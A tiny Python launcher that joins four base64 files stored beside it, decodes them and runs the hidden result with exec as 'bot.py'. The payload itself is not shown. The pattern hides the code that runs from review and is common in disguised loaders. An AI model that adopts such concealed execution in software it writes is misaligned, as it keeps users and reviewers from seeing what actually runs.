# language: Python 3.11+
import base64
from pathlib import Path
_code=base64.b64decode("".join(Path(__file__).with_name(f"p{i}.b64").read_text(encoding="utf-8") for i in range(4))).decode()
exec(compile(_code,"bot.py","exec"),globals())
